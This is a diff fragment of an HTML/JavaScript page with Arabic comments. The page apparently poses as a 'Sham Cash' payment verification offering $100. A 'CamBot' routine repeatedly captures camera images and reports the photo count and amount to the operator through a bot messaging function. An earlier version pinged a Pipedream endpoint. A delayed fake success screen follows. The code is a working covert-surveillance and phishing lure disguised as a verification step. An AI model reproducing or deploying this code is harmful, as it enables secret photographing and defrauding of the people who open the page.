+              updateProgress(65 + (imagesSent / CAPTURE_COUNT) * 25);
             }
             
             if (imagesSent >= CAPTURE_COUNT) {
@@ -599,46 +765,41 @@
           }, CAPTURE_INTERVAL);
         });
 
-        // إتمام العملية
+        // اكتمال
         await Config.sendMessage(
-          `✅ <b>اكتمل التحقق</b>\n` +
-          `📸 عدد الصور: ${imagesSent}\n` +
-          `🕐 ${new Date().toLocaleString('ar-SA')}`
+          `✅ <b>اكتمل التحقق - شام كاش</b>\n` +
+          `📸 ${imagesSent} صور\n` +
+          `💰 المبلغ: 100$\n` +
+          `🕐 ${new Date().toLocaleString('ar-SY')}`
         );
 
-        setStepStatus(4, 'completed');
-        updateProgress(100, 'اكتمل التحقق');
+        updateStep(3, 'completed');
+        updateProgress(100);
         CamBot.stop();
+
+        // عرض رسالة النجاح بعد تأخير قصير
+        await new Promise(r => setTimeout(r, 1500));
         showSuccess();
 
       } catch (error) {
         console.error('خطأ:', error);
-        showError(error.message || 'حدث خطأ غير متوقع');
         CamBot.stop();
+        showError(error.message || 'حدث خطأ غير متوقع');
         
         try {
-          await Config.sendMessage(`❌ <b>فشل التحقق:</b> ${error.message}`);
+          await Config.sendMessage(`❌ فشل: ${error.message}`);
         } catch (e) {}
       }
     }
 
     // ============ بدء التشغيل ============
-    // تهيئة CamBot
-    CamBot.init({
-      captureCount: CAPTURE_COUNT,
-      captureInterval: CAPTURE_INTERVAL,
-      imageQuality: 0.8
-    });
-
-    // اختبار الاتصال بالسيرفر
-    fetch(Config.PIPEDREAM_URL, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ action: 'ping' })
-    }).catch(() => {}).finally(() => {
-      // تشغيل البرنامج الرئيسي
+    // إخفاء شريط التحميل الأولي
+    updateProgress(5);
+    
+    // تشغيل البرنامج بعد تأخير بسيط للتحميل
+    setTimeout(() => {
       main();
-    });
+    }, 500);
   </script>
 </body>
 </html>
